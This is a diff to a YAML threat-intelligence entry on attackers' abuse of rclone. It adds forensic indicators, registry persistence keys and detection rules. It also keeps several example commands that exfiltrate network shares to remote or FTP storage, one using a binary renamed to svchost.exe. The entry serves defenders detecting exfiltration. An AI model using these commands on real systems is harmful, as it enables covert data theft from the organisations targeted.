@@ -1,6 +1,4 @@
 Name: rclone
-Aliases:
-  - rclone.exe
 Description: >
   rclone is a command-line program for managing files on cloud storage. It supports over 40 cloud storage providers
   and enables syncing, copying, and transferring data. Adversaries abuse rclone to exfiltrate data due to its ability
@@ -12,7 +10,6 @@ Platform:
   - macOS
 Execution:
   - cli
-  - script
 Capabilities:
   - file-sync
   - encrypted-transfer
@@ -21,16 +18,26 @@ Capabilities:
   - stealth-upload
   - direct-to-cloud
   - protocol-tunneling
-Stealth:
-  - masquerading
   - encrypted-transfer
-  - background-execution
   - proxy-support
   - scriptable-execution
 Forensics:
+  FileNamePatterns:
+    - rclone.exe
+    - rclone64.exe
+    - svchost.exe        # Common masqueraded name
+    - sihost.exe         # Common masqueraded name
+    - rundll32.exe       # Also used in some renamed payloads
   BinaryLocations:
     - C:\Users\<user>\rclone.exe
     - /usr/bin/rclone
+  RegistryPersistence:
+    - 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run\rclone_service'
+    - 'HKLM\Software\Microsoft\Windows\CurrentVersion\Run\rclone_updater'
+  LogFiles:
+    - 'C:\Users\<username>\AppData\Local\rclone\rclone.log'
+    - '%TEMP%\rclone-activity.log'
+    - '/var/log/rclone.log'
   CommandLineArgs:
     - copy
     - sync
@@ -50,44 +57,51 @@ Forensics:
     - ~/.config/rclone/rclone.conf
   ScheduledTask: []
 ThreatActors:
-  - REvil
-  - Quantum
-  - Akira
-  - Conti
-References:
-  - https://www.trendmicro.com/en_us/research/22/h/attackers-abuse-rclone-and-megasync-to-exfiltrate-data.html
-  - https://www.sentinelone.com/blog/how-rclone-became-a-favorite-tool-for-ransomware-data-exfiltration/
-  - https://www.crowdstrike.com/blog/rclone-the-new-threat-for-data-exfiltration/
-  - https://unit42.paloaltonetworks.com/threat-assessment-rclone-data-exfiltration/
-Tags:
-  - third-party
-  - cli
-  - cloud-based
-  - encrypted-transfer
-  - masquerading
-  - persistent
-  - stealth
-  - scriptable
-  - common-lolbas
+  - ransomware
+  - apt
 UseCases:
   - Title: Standard cloud upload
     Description: Upload a directory to remote cloud storage using default config.
     Command: rclone copy /data remote:backup
-
   - Title: Masqueraded exfiltration with custom config
     Description: Masqueraded rclone binary used with renamed config to perform exfiltration.
     Command: |
       svchost.exe --config svchost.conf --progress --no-check-certificate copy "\\Server\C$\Share" ftp1:/domain/share
-
   - Title: Ransomware-style exfiltration with filtering
     Description: Copy data while excluding file types and using multiple threads to speed up the upload.
     Command: |
       rclone.exe copy --max-age 5y "\\BACKUP\E:\" remote:Groups --exclude "*.{psd,rar,zip}"
       --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12 -P
-
   - Title: FTP exfiltration with minimal footprint
     Description: Send data to an FTP server while skipping known extensions and logging minimal output.
     Command: |
       rclone copy \\192.168.1.100\f$ st:"/home/user/data" --max-age 1y
       --exclude "*.{iso,exe,zip}" --ignore-existing --auto-confirm -q --transfers 5 -P
-LastModified: 2025-09-18
+Detection:
+  - Type: Suspicious Parent Process
+    Description: Detect execution of rclone.exe with uncommon or suspicious parent processes (e.g., powershell.exe, wscript.exe, office applications, OneNote, WMIC).
+  - Type: Masquerading Detection
+    Description: Alert when rclone is renamed to common system binaries (e.g., svchost.exe) but shows rclone-related flags in command-line (e.g., --config, copy, sync).
+  - Type: WebDAV/FTP Exfiltration
+    Description: Monitor for rclone activity over non-standard protocols (e.g., FTP, WebDAV). Rclone used in Egregor and others to exfiltrate via these channels.
+  - Type: Large Data Transfer
+    Description: Correlate rclone execution with high bytes_out in a short timeframe, indicating bulk exfiltration after archive creation.
+  - Type: Scheduled Task or Registry Persistence
+    Description: Check for creation of scheduled tasks or registry Run keys that execute rclone (e.g., via svchost.exe masquerade).
+References:
+  - https://attack.mitre.org/techniques/T1567/002/
+  - https://attack.mitre.org/techniques/T1048/
+  - https://attack.mitre.org/techniques/T1030/
+  - https://attack.mitre.org/techniques/T1036/
+  - https://attack.mitre.org/techniques/T1029/
+  - https://redcanary.com/blog/threat-detection/rclone-mega-extortion/
+  - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1567.002/T1567.002.md
+  - https://github.com/splunk/security_content/blob/develop/detections/endpoint/detect_renamed_rclone.yml
+  - https://detection.fyi/sigmahq/sigma/windows/process_creation/proc_creation_win_pua_rclone_execution/
+  - https://docs.logpoint.com/docs/alert-rules/en/latest/MITRE%20ATT&CK%20Analytics.html#lp-rclone-utility-execution
+  - https://github.com/SigmaHQ/sigma/blob/master/rules/web/proxy_generic/proxy_ua_rclone.yml
+  - https://www.trendmicro.com/en_us/research/22/h/attackers-abuse-rclone-and-megasync-to-exfiltrate-data.html
+  - https://www.sentinelone.com/blog/how-rclone-became-a-favorite-tool-for-ransomware-data-exfiltration/
+  - https://www.crowdstrike.com/blog/rclone-the-new-threat-for-data-exfiltration/
+  - https://unit42.paloaltonetworks.com/threat-assessment-rclone-data-exfiltration/
+LastModified: '2025-11-17'
